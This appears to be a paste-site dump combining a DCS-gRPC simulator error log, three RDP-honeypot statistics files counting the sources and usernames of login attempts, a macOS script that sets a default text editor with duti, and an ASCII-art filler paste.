	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:142: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:03:01.779 INFO    dcs_grpc::stats: Calls per second: average=64.34, highest=66.00
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Events per second: average=14.36, highest=1.00
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Blocking time: total=2.322ms (≙ 0.00%)
2024-05-12 19:03:01.780 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:04:01.223 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Calls per second: average=64.28, highest=65.00
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Events per second: average=14.60, highest=0.00
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Blocking time: total=2.2783ms (≙ 0.00%)
2024-05-12 19:04:01.785 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:04:32.490 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:37.836 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:43.368 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:04:52.228 ERROR   dcs_grpc: failed to deserialize event: deserialize error: missing field `id`
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Calls per second: average=64.31, highest=65.00
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Events per second: average=14.60, highest=0.00
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Blocking time: total=2.3493ms (≙ 0.00%)
2024-05-12 19:05:01.791 INFO    dcs_grpc::stats: Queue size: average=0.00, biggest=0
2024-05-12 19:05:14.387 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
	[C]: in function 'explosion'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:306: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:283>
	[C]: in function 'pcall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:354: in function 'protectedCall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:498: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:497>
2024-05-12 19:05:14.387 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:142: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
2024-05-12 19:05:15.575 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to index local 'group' (a nil value)
stack traceback:
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: in function 'group'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:27: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:19>
	(tail call): ?
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:43: in function 'typed_exporter'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:359: in function <[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\methods\mission.lua""]:63>
	(tail call): ?
	[C]: in function 'xpcall'
	[string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\grpc.lua""]:233: in function 'onEvent'
	[string ""Scripts/World/EventHandlers.lua""]:13: in function <[string ""Scripts/World/EventHandlers.lua""]:11>
	[C]: in function 'explosion'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:306: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:283>
	[C]: in function 'pcall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:354: in function 'protectedCall'
	[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:498: in function <[string ""C:/Scripts/PersianGulf/Splash_Damage_2_0.lua""]:497>
2024-05-12 19:05:15.575 ERROR   dcs_grpc: Error in event handler: [string ""C:\Users\admin\Saved Games\DCS.Core\Scripts\DCS-gRPC\exporters\object.lua""]:49: attempt to inde"
MSQhBRrF,2024-05-12_stats.json,rdp_snitch,JSON,Sunday 12th of May 2024 07:18:11 PM CDT,"{
  ""ip"": {
    ""104.152.52.231"": 3,
    ""5.42.107.83"": 6,
    ""94.232.41.30"": 6,
    ""185.242.235.113"": 3,
    ""194.165.16.78"": 6,
    ""182.163.102.197"": 3,
    ""194.165.16.73"": 12,
    ""185.196.220.41"": 9,
    ""87.251.75.64"": 3,
    ""37.255.222.209"": 21,
    ""193.142.146.227"": 9,
    ""35.203.211.144"": 9,
    ""71.6.134.234"": 30,
    ""87.251.75.145"": 9,
    ""167.94.145.103"": 3,
    ""64.124.50.139"": 6,
    ""185.170.144.113"": 27,
    ""87.251.75.120"": 6,
    ""212.70.149.146"": 9,
    ""45.8.22.24"": 3,
    ""185.170.144.3"": 6,
    ""152.32.197.12"": 3,
    ""45.33.91.123"": 9,
    ""35.203.210.184"": 9,
    ""117.16.46.253"": 3,
    ""123.56.20.194"": 3,
    ""39.104.209.131"": 3,
    ""157.97.121.249"": 3,
    ""43.153.185.38"": 3,
    ""45.79.114.208"": 12,
    ""139.177.207.133"": 3,
    ""172.233.146.111"": 3,
    ""2.57.149.92"": 3,
    ""198.235.24.242"": 9,
    ""152.32.183.213"": 81,
    ""112.4.139.162"": 3,
    ""81.12.137.74"": 12,
    ""80.66.76.134"": 3,
    ""194.170.200.70"": 3,
    ""45.227.254.54"": 6,
    ""157.97.121.78"": 3,
    ""45.227.254.55"": 12,
    ""105.75.72.104"": 21,
    ""205.210.31.152"": 9,
    ""167.94.146.48"": 3,
    ""159.223.34.114"": 3
  },
  ""asn"": {
    ""AS14987"": 3,
    ""AS210644"": 6,
    ""AS208091"": 27,
    ""AS55933"": 3,
    ""AS48721"": 18,
    ""AS9230"": 3,
    ""AS208046"": 18,
    ""AS58224"": 21,
    ""AS396982"": 36,
    ""AS10439"": 30,
    ""AS398705"": 6,
    ""AS6461"": 6,
    ""AS197414"": 33,
    ""AS204428"": 9,
    ""AS206216"": 3,
    ""AS135377"": 84,
    ""AS63949"": 27,
    ""AS18031"": 3,
    ""AS37963"": 6,
    ""AS396356"": 6,
    ""AS132203"": 3,
    ""AS208312"": 3,
    ""AS56046"": 3,
    ""AS12302"": 12,
    ""AS5384"": 3,
    ""AS267784"": 18,
    ""AS36884"": 21,
    ""AS14061"": 3
  },
  ""isp"": {
    ""Rethem Hosting LLC"": 3,
    ""Aeza International LTD"": 6,
    ""Xhost Internet Solutions LP"": 60,
    ""Cloudie Limited"": 3,
    ""Flyservers S.A."": 36,
    ""Bangladesh Online Ltd"": 3,
    ""ColocationX Ltd."": 18,
    ""Iran Telecommunication Company PJS"": 21,
    ""Google LLC"": 36,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 6,
    ""Zayo Bandwidth"": 6,
    ""SS-Net"": 9,
    ""Advin Services LLC"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 84,
    ""Akamai Technologies, Inc."": 27,
    ""Sangmyung University"": 3,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""Consumer-Network"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Red Byte LLC"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Vodafone RO"": 12,
    ""Emirates Telecommunications Corporation"": 3,
    ""Provider 36884 Wana Corporate"": 21,
    ""DigitalOcean, LLC"": 3
  },
  ""org"": {
    ""Rethem Hosting LLC"": 3,
    ""Aeza International LTD"": 6,
    ""Dmitriy Panchenko"": 6,
    ""TEN"": 3,
    ""Flyservers S.A"": 18,
    ""Bangladesh Online Ltd"": 3,
    ""Makut Investments"": 9,
    ""Xhost Internet Solutions"": 21,
    ""Telecommunication Company of Esfahan"": 21,
    ""ColocationX Ltd"": 9,
    ""Google Cloud (europe-west2)"": 18,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 6,
    ""Microsoft Corporation"": 6,
    ""Xhostis"": 33,
    ""4Media Ltd"": 9,
    ""Advin Services LLC"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 24,
    ""Korean Education Network"": 3,
    ""Aliyun Computing Co., LTD"": 6,
    ""Unknown"": 6,
    ""Tencent Cloud Computing"": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Palo Alto Networks, Inc"": 18,
    ""Ucloud Information Technology"": 81,
    ""China Mobile Communications Corporation"": 3,
    ""Vodafone Romania S.A."": 12,
    ""Emirates Telecommunications Corporation"": 3,
    ""UAB Host Baltic"": 18,
    ""Wana Corporate"": 21,
    ""DigitalOcean, LLC"": 3
  },
  ""regionName"": {
    ""Illinois"": 3,
    ""Hesse"": 12,
    ""Perm Krai"": 6,
    ""Sha Tin"": 3,
    ""Kaunas"": 18,
    ""Dhaka Division"": 3,
    ""Virginia"": 96,
    ""North Holland"": 63,
    ""Isfahan"": 21,
    ""England"": 18,
    ""Nevada"": 30,
    ""Plovdiv"": 9,
    ""California"": 36,
    ""S\u00e3o Paulo"": 3,
    ""New Jersey"": 15,
    ""Seoul"": 3,
    ""Beijing"": 6,
    ""Tokyo"": 3,
    ""Georgia"": 3,
    ""Lesser Poland"": 3,
    ""Jiangsu"": 3,
    ""Bucure\u0219ti"": 12,
    ""Dubai"": 3,
    ""Vilnius"": 18,
    ""Casablanca-Settat"": 21,
    ""Central Singapore"": 3
  },
  ""country"": {
    ""United States"": 183,
    ""Germany"": 12,
    ""Russia"": 6,
    ""Hong Kong"": 3,
    ""Lithuania"": 36,
    ""Bangladesh"": 3,
    ""The Netherlands"": 63,
    ""Iran"": 21,
    ""United Kingdom"": 18,
    ""Bulgaria"": 9,
    ""Brazil"": 3,
    ""South Korea"": 3,
    ""China"": 9,
    ""Japan"": 3,
    ""Poland"": 3,
    ""Romania"": 12,
    ""United Arab Emirates"": 3,
    ""Morocco"": 21,
    ""Singapore"": 3
  },
  ""account"": {
    ""nmap"": 3,
    ""Test"": 54,
    ""hello"": 81,
    ""Domain"": 63,
    ""Administr"": 30,
    ""DFRKKTCgH"": 3,
    ""qFvELU"": 3,
    ""sAELYo"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 18,
    ""Administrator"": 30,
    ""vyOtISaUs"": 3,
    ""jwBcTt"": 3,
    ""CeYKnZ"": 3,
    ""iazp6yij"": 12,
    ""beio"": 3,
    ""eOXuGiqPp"": 3,
    ""GQKeOo"": 3,
    ""YyvXFx"": 3,
    ""Admin"": 27,
    ""Whatuptime.com"": 27,
    ""ugnTwcNRo"": 3,
    ""yQRxuX"": 3,
    ""ruGHbZ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 414
  },
  ""client_build"": {
    ""Unknown"": 414
  },
  ""client_name"": {
    ""Unknown"": 414
  },
  ""ip_type"": {
    ""hosting"": 192,
    ""Unknown"": 207,
    ""hosting & proxy"": 3,
    ""mobile"": 12
  }
}"
E2RXUHdG,2024-05-12_stats.json,rdp_snitch,JSON,Sunday 12th of May 2024 07:16:06 PM CDT,"{
  ""ip"": {
    ""104.152.52.231"": 2,
    ""5.42.107.83"": 4,
    ""94.232.41.30"": 4,
    ""185.242.235.113"": 2,
    ""194.165.16.78"": 4,
    ""182.163.102.197"": 2,
    ""194.165.16.73"": 8,
    ""185.196.220.41"": 6,
    ""87.251.75.64"": 2,
    ""37.255.222.209"": 14,
    ""193.142.146.227"": 6,
    ""35.203.211.144"": 6,
    ""71.6.134.234"": 20,
    ""87.251.75.145"": 6,
    ""167.94.145.103"": 2,
    ""64.124.50.139"": 4,
    ""185.170.144.113"": 18,
    ""87.251.75.120"": 4,
    ""212.70.149.146"": 6,
    ""45.8.22.24"": 2,
    ""185.170.144.3"": 4,
    ""152.32.197.12"": 2,
    ""45.33.91.123"": 6,
    ""35.203.210.184"": 6,
    ""117.16.46.253"": 2,
    ""123.56.20.194"": 2,
    ""39.104.209.131"": 2,
    ""157.97.121.249"": 2,
    ""43.153.185.38"": 2,
    ""45.79.114.208"": 8,
    ""139.177.207.133"": 2,
    ""172.233.146.111"": 2,
    ""2.57.149.92"": 2,
    ""198.235.24.242"": 6,
    ""152.32.183.213"": 54,
    ""112.4.139.162"": 2,
    ""81.12.137.74"": 8,
    ""80.66.76.134"": 2,
    ""194.170.200.70"": 2,
    ""45.227.254.54"": 4,
    ""157.97.121.78"": 2,
    ""45.227.254.55"": 8,
    ""105.75.72.104"": 14,
    ""205.210.31.152"": 6,
    ""167.94.146.48"": 2,
    ""159.223.34.114"": 2
  },
  ""asn"": {
    ""AS14987"": 2,
    ""AS210644"": 4,
    ""AS208091"": 18,
    ""AS55933"": 2,
    ""AS48721"": 12,
    ""AS9230"": 2,
    ""AS208046"": 12,
    ""AS58224"": 14,
    ""AS396982"": 24,
    ""AS10439"": 20,
    ""AS398705"": 4,
    ""AS6461"": 4,
    ""AS197414"": 22,
    ""AS204428"": 6,
    ""AS206216"": 2,
    ""AS135377"": 56,
    ""AS63949"": 18,
    ""AS18031"": 2,
    ""AS37963"": 4,
    ""AS396356"": 4,
    ""AS132203"": 2,
    ""AS208312"": 2,
    ""AS56046"": 2,
    ""AS12302"": 8,
    ""AS5384"": 2,
    ""AS267784"": 12,
    ""AS36884"": 14,
    ""AS14061"": 2
  },
  ""isp"": {
    ""Rethem Hosting LLC"": 2,
    ""Aeza International LTD"": 4,
    ""Xhost Internet Solutions LP"": 40,
    ""Cloudie Limited"": 2,
    ""Flyservers S.A."": 24,
    ""Bangladesh Online Ltd"": 2,
    ""ColocationX Ltd."": 12,
    ""Iran Telecommunication Company PJS"": 14,
    ""Google LLC"": 24,
    ""CariNet, Inc."": 20,
    ""Censys, Inc."": 4,
    ""Zayo Bandwidth"": 4,
    ""SS-Net"": 6,
    ""Advin Services LLC"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 56,
    ""Akamai Technologies, Inc."": 18,
    ""Sangmyung University"": 2,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""Consumer-Network"": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Red Byte LLC"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Vodafone RO"": 8,
    ""Emirates Telecommunications Corporation"": 2,
    ""Provider 36884 Wana Corporate"": 14,
    ""DigitalOcean, LLC"": 2
  },
  ""org"": {
    ""Rethem Hosting LLC"": 2,
    ""Aeza International LTD"": 4,
    ""Dmitriy Panchenko"": 4,
    ""TEN"": 2,
    ""Flyservers S.A"": 12,
    ""Bangladesh Online Ltd"": 2,
    ""Makut Investments"": 6,
    ""Xhost Internet Solutions"": 14,
    ""Telecommunication Company of Esfahan"": 14,
    ""ColocationX Ltd"": 6,
    ""Google Cloud (europe-west2)"": 12,
    ""CariNet, Inc."": 20,
    ""Censys, Inc."": 4,
    ""Microsoft Corporation"": 4,
    ""Xhostis"": 22,
    ""4Media Ltd"": 6,
    ""Advin Services LLC"": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Linode"": 16,
    ""Korean Education Network"": 2,
    ""Aliyun Computing Co., LTD"": 4,
    ""Unknown"": 4,
    ""Tencent Cloud Computing"": 2,
    ""Akamai Technologies, Inc."": 2,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Ucloud Information Technology"": 54,
    ""China Mobile Communications Corporation"": 2,
    ""Vodafone Romania S.A."": 8,
    ""Emirates Telecommunications Corporation"": 2,
    ""UAB Host Baltic"": 12,
    ""Wana Corporate"": 14,
    ""DigitalOcean, LLC"": 2
  },
  ""regionName"": {
    ""Illinois"": 2,
    ""Hesse"": 8,
    ""Perm Krai"": 4,
    ""Sha Tin"": 2,
    ""Kaunas"": 12,
    ""Dhaka Division"": 2,
    ""Virginia"": 64,
    ""North Holland"": 42,
    ""Isfahan"": 14,
    ""England"": 12,
    ""Nevada"": 20,
    ""Plovdiv"": 6,
    ""California"": 24,
    ""S\u00e3o Paulo"": 2,
    ""New Jersey"": 10,
    ""Seoul"": 2,
    ""Beijing"": 4,
    ""Tokyo"": 2,
    ""Georgia"": 2,
    ""Lesser Poland"": 2,
    ""Jiangsu"": 2,
    ""Bucure\u0219ti"": 8,
    ""Dubai"": 2,
    ""Vilnius"": 12,
    ""Casablanca-Settat"": 14,
    ""Central Singapore"": 2
  },
  ""country"": {
    ""United States"": 122,
    ""Germany"": 8,
    ""Russia"": 4,
    ""Hong Kong"": 2,
    ""Lithuania"": 24,
    ""Bangladesh"": 2,
    ""The Netherlands"": 42,
    ""Iran"": 14,
    ""United Kingdom"": 12,
    ""Bulgaria"": 6,
    ""Brazil"": 2,
    ""South Korea"": 2,
    ""China"": 6,
    ""Japan"": 2,
    ""Poland"": 2,
    ""Romania"": 8,
    ""United Arab Emirates"": 2,
    ""Morocco"": 14,
    ""Singapore"": 2
  },
  ""account"": {
    ""nmap"": 2,
    ""Test"": 36,
    ""hello"": 54,
    ""Domain"": 42,
    ""Administr"": 20,
    ""DFRKKTCgH"": 2,
    ""qFvELU"": 2,
    ""sAELYo"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""(empty)"": 12,
    ""Administrator"": 20,
    ""vyOtISaUs"": 2,
    ""jwBcTt"": 2,
    ""CeYKnZ"": 2,
    ""iazp6yij"": 8,
    ""beio"": 2,
    ""eOXuGiqPp"": 2,
    ""GQKeOo"": 2,
    ""YyvXFx"": 2,
    ""Admin"": 18,
    ""Whatuptime.com"": 18,
    ""ugnTwcNRo"": 2,
    ""yQRxuX"": 2,
    ""ruGHbZ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 276
  },
  ""client_build"": {
    ""Unknown"": 276
  },
  ""client_name"": {
    ""Unknown"": 276
  },
  ""ip_type"": {
    ""hosting"": 128,
    ""Unknown"": 138,
    ""hosting & proxy"": 2,
    ""mobile"": 8
  }
}"
BsL5gB1f,2024-05-12_stats.json,rdp_snitch,JSON,Sunday 12th of May 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""104.152.52.231"": 1,
    ""5.42.107.83"": 2,
    ""94.232.41.30"": 2,
    ""185.242.235.113"": 1,
    ""194.165.16.78"": 2,
    ""182.163.102.197"": 1,
    ""194.165.16.73"": 4,
    ""185.196.220.41"": 3,
    ""87.251.75.64"": 1,
    ""37.255.222.209"": 7,
    ""193.142.146.227"": 3,
    ""35.203.211.144"": 3,
    ""71.6.134.234"": 10,
    ""87.251.75.145"": 3,
    ""167.94.145.103"": 1,
    ""64.124.50.139"": 2,
    ""185.170.144.113"": 9,
    ""87.251.75.120"": 2,
    ""212.70.149.146"": 3,
    ""45.8.22.24"": 1,
    ""185.170.144.3"": 2,
    ""152.32.197.12"": 1,
    ""45.33.91.123"": 3,
    ""35.203.210.184"": 3,
    ""117.16.46.253"": 1,
    ""123.56.20.194"": 1,
    ""39.104.209.131"": 1,
    ""157.97.121.249"": 1,
    ""43.153.185.38"": 1,
    ""45.79.114.208"": 4,
    ""139.177.207.133"": 1,
    ""172.233.146.111"": 1,
    ""2.57.149.92"": 1,
    ""198.235.24.242"": 3,
    ""152.32.183.213"": 27,
    ""112.4.139.162"": 1,
    ""81.12.137.74"": 4,
    ""80.66.76.134"": 1,
    ""194.170.200.70"": 1,
    ""45.227.254.54"": 2,
    ""157.97.121.78"": 1,
    ""45.227.254.55"": 4,
    ""105.75.72.104"": 7,
    ""205.210.31.152"": 3,
    ""167.94.146.48"": 1,
    ""159.223.34.114"": 1
  },
  ""asn"": {
    ""AS14987"": 1,
    ""AS210644"": 2,
    ""AS208091"": 9,
    ""AS55933"": 1,
    ""AS48721"": 6,
    ""AS9230"": 1,
    ""AS208046"": 6,
    ""AS58224"": 7,
    ""AS396982"": 12,
    ""AS10439"": 10,
    ""AS398705"": 2,
    ""AS6461"": 2,
    ""AS197414"": 11,
    ""AS204428"": 3,
    ""AS206216"": 1,
    ""AS135377"": 28,
    ""AS63949"": 9,
    ""AS18031"": 1,
    ""AS37963"": 2,
    ""AS396356"": 2,
    ""AS132203"": 1,
    ""AS208312"": 1,
    ""AS56046"": 1,
    ""AS12302"": 4,
    ""AS5384"": 1,
    ""AS267784"": 6,
    ""AS36884"": 7,
    ""AS14061"": 1
  },
  ""isp"": {
    ""Rethem Hosting LLC"": 1,
    ""Aeza International LTD"": 2,
    ""Xhost Internet Solutions LP"": 20,
    ""Cloudie Limited"": 1,
    ""Flyservers S.A."": 12,
    ""Bangladesh Online Ltd"": 1,
    ""ColocationX Ltd."": 6,
    ""Iran Telecommunication Company PJS"": 7,
    ""Google LLC"": 12,
    ""CariNet, Inc."": 10,
    ""Censys, Inc."": 2,
    ""Zayo Bandwidth"": 2,
    ""SS-Net"": 3,
    ""Advin Services LLC"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 28,
    ""Akamai Technologies, Inc."": 9,
    ""Sangmyung University"": 1,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Consumer-Network"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Red Byte LLC"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Vodafone RO"": 4,
    ""Emirates Telecommunications Corporation"": 1,
    ""Provider 36884 Wana Corporate"": 7,
    ""DigitalOcean, LLC"": 1
  },
  ""org"": {
    ""Rethem Hosting LLC"": 1,
    ""Aeza International LTD"": 2,
    ""Dmitriy Panchenko"": 2,
    ""TEN"": 1,
    ""Flyservers S.A"": 6,
    ""Bangladesh Online Ltd"": 1,
    ""Makut Investments"": 3,
    ""Xhost Internet Solutions"": 7,
    ""Telecommunication Company of Esfahan"": 7,
    ""ColocationX Ltd"": 3,
    ""Google Cloud (europe-west2)"": 6,
    ""CariNet, Inc."": 10,
    ""Censys, Inc."": 2,
    ""Microsoft Corporation"": 2,
    ""Xhostis"": 11,
    ""4Media Ltd"": 3,
    ""Advin Services LLC"": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Linode"": 8,
    ""Korean Education Network"": 1,
    ""Aliyun Computing Co., LTD"": 2,
    ""Unknown"": 2,
    ""Tencent Cloud Computing"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Palo Alto Networks, Inc"": 6,
    ""Ucloud Information Technology"": 27,
    ""China Mobile Communications Corporation"": 1,
    ""Vodafone Romania S.A."": 4,
    ""Emirates Telecommunications Corporation"": 1,
    ""UAB Host Baltic"": 6,
    ""Wana Corporate"": 7,
    ""DigitalOcean, LLC"": 1
  },
  ""regionName"": {
    ""Illinois"": 1,
    ""Hesse"": 4,
    ""Perm Krai"": 2,
    ""Sha Tin"": 1,
    ""Kaunas"": 6,
    ""Dhaka Division"": 1,
    ""Virginia"": 32,
    ""North Holland"": 21,
    ""Isfahan"": 7,
    ""England"": 6,
    ""Nevada"": 10,
    ""Plovdiv"": 3,
    ""California"": 12,
    ""S\u00e3o Paulo"": 1,
    ""New Jersey"": 5,
    ""Seoul"": 1,
    ""Beijing"": 2,
    ""Tokyo"": 1,
    ""Georgia"": 1,
    ""Lesser Poland"": 1,
    ""Jiangsu"": 1,
    ""Bucure\u0219ti"": 4,
    ""Dubai"": 1,
    ""Vilnius"": 6,
    ""Casablanca-Settat"": 7,
    ""Central Singapore"": 1
  },
  ""country"": {
    ""United States"": 61,
    ""Germany"": 4,
    ""Russia"": 2,
    ""Hong Kong"": 1,
    ""Lithuania"": 12,
    ""Bangladesh"": 1,
    ""The Netherlands"": 21,
    ""Iran"": 7,
    ""United Kingdom"": 6,
    ""Bulgaria"": 3,
    ""Brazil"": 1,
    ""South Korea"": 1,
    ""China"": 3,
    ""Japan"": 1,
    ""Poland"": 1,
    ""Romania"": 4,
    ""United Arab Emirates"": 1,
    ""Morocco"": 7,
    ""Singapore"": 1
  },
  ""account"": {
    ""nmap"": 1,
    ""Test"": 18,
    ""hello"": 27,
    ""Domain"": 21,
    ""Administr"": 10,
    ""DFRKKTCgH"": 1,
    ""qFvELU"": 1,
    ""sAELYo"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""(empty)"": 6,
    ""Administrator"": 10,
    ""vyOtISaUs"": 1,
    ""jwBcTt"": 1,
    ""CeYKnZ"": 1,
    ""iazp6yij"": 4,
    ""beio"": 1,
    ""eOXuGiqPp"": 1,
    ""GQKeOo"": 1,
    ""YyvXFx"": 1,
    ""Admin"": 9,
    ""Whatuptime.com"": 9,
    ""ugnTwcNRo"": 1,
    ""yQRxuX"": 1,
    ""ruGHbZ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 138
  },
  ""client_build"": {
    ""Unknown"": 138
  },
  ""client_name"": {
    ""Unknown"": 138
  },
  ""ip_type"": {
    ""hosting"": 64,
    ""Unknown"": 69,
    ""hosting & proxy"": 1,
    ""mobile"": 4
  }
}"
nb0Fi3d7,set-editor,tygcrawford,Bash,Sunday 12th of May 2024 06:38:04 PM CDT,"#!/usr/bin/env zsh
set -euo pipefail

if [[ ""$#"" -ne 1 ]]; then
  echo ""Usage: $0 \""<text_editor>\""""
  echo ""Example: $0 \""Visual Studio Code\""""
  exit 1
fi

editor=$1

brew install duti

if ! application=$(osascript -e ""id of app \""$editor\""""); then
  echo ""Error: $1 is not an application""
  exit 1
fi

duti -s $application public.json all
duti -s $application public.plain-text all
duti -s $application public.python-script all
duti -s $application public.shell-script all
duti -s $application public.source-code all
duti -s $application public.text all
duti -s $application public.unix-executable all
duti -s $application public.data all

duti -s $application .c all
duti -s $application .cpp all
duti -s $application .cs all
duti -s $application .css all
duti -s $application .go all
duti -s $application .java all
duti -s $application .js all
duti -s $application .sass all
duti -s $application .scss all
duti -s $application .less all
duti -s $application .vue all
duti -s $application .cfg all
duti -s $application .json all
duti -s $application .jsx all
duti -s $application .log all
duti -s $application .lua all
duti -s $application .md all
duti -s $application .php all
duti -s $application .pl all
duti -s $application .py all
duti -s $application .rb all
duti -s $application .ts all
duti -s $application .tsx all
duti -s $application .txt all
duti -s $application .conf all
duti -s $application .yaml all
duti -s $application .yml all
duti -s $application .toml all

echo ""Success: $1 changed to default text editor"""
iQPbEura,honey treat,Ennortix,PHP,Sunday 12th of May 2024 06:35:52 PM CDT,"                               eeeeeeeeee111111111111111111111111111111111111111114444444444444444444441111111111eeeeeeeeee                                         
                               eeeeeeeeee111111111111111111111111111111111111111114444444444444444444441111111111eeeeeeeeee                                         
                               eeeeeeeeee111111111111111111111111111111111111111114444444444444444444441111111111eeeeeeeeee                                         
                               eeeeeeeeee111111111111111111111111111111111111111114444444444444444444441111111111eeeeeeeeee                                         
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
